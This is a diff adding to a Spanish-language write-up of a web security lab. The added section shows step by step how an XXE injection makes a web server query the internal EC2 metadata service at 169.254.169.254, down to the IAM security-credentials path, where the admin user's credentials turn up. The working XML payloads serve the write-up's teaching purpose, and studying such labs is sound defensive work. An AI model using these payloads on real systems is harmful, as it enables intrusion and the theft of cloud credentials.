@@ -157,4 +157,124 @@ Podemos ver la siguiente estructura XML, por lo que intentaremos inyectar nuestr
 
 Podemos apreciar que nos muestra el contenido del servidor, por lo que es vulnerable, así que ahora lo que haremos es el objetivo de este laboratorio, descubrir la clave secreta que esta dentro de un servidor aislado de nuestra maquina atacante pero al cual en teoría podemos acceder haciendo las consultas desde el servidor web, y como ese servidor web esta en la misma red que el servidor aislado, podremos tener conexión.
 
-Ahora lo que haremos será 
+Vemos que en las instrucciónes del laboratorio nos dice que existe un EC2 que como recordamos es un servidor que esta en la red interna del servidor que intentamos atacar, nos dice que la ip del EC2 es **http://169.254.169.254/**.
+
+Así que un esquema de lo que estamos haciendo ahora sería algo así:
+
+![ec2](/assets/images/LabsXXE/lab2/ec2.png)
+
+Podemos apreciar que tenemos conexión con el servidor web, pero no con la maquina EC2 a la que el servidor web si tiene acceso.
+
+Y en caso de que ese servidor tenga capacidad de **directory listing** podremos ver datos y buscar algo valioso.
+
+<br>
+
+Así que ahora através de la vulnerabilidad XML, llamaremos a la ip del servidor EC2, y como la petición la interpretará el servidor web y ese servidor web tiene acceso a el EC2, entonces nos podrá listar algo en caso de estar habilitado un **directory listing**.
+
+Nuestra consulta se verá así:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Y vemos que al tramitar la petición nos responde lo siguiente:
+
+![latest](/assets/images/LabsXXE/lab2/latest.png)
+
+Podemos apreciar que nos ha listado una ruta llamada **latest** en el mensaje de respuesta, así que agregaremos ese valor a la url de la entidad y veremos que queda así:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Y ahora veremos la respuesta:
+
+![metadata](/assets/images/LabsXXE/lab2/metadata.png)
+
+Ahora nos listo otra ruta llamada **meta-data**, por lo cual la pondremos en la url y seguir aver que más encontramos:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Y vemos la respuesta:
+
+![iam](/assets/images/LabsXXE/lab2/iam.png)
+
+Ahora vemos otra ruta llamada iam, la cual al entrar nuevamente agregandola a la url:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Veremos lo siguiente:
+
+![credentials](/assets/images/LabsXXE/lab2/credentials.png)
+
+Y al acceder a esta otra ruta que encontramos llamada **security-credentials** veremos lo siguiente:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Ahora vemos que dentro de esta ruta encontramos esto:
+
+![admin](/assets/images/LabsXXE/lab2/admin.png)
+
+Encontramos otra ruta o archivo llamado **admin**, al cual al acceder veremos lo siguiente:
+
+![dat](/assets/images/LabsXXE/lab2/dat.png)
+
+Y podemos ver que hemos encontrado las credenciales al parecer del usuario admin.
+
+Y ya habremos terminado con este laboratorio 2.
+
+<br>
+
+# XXE Blind Out-of-band
+
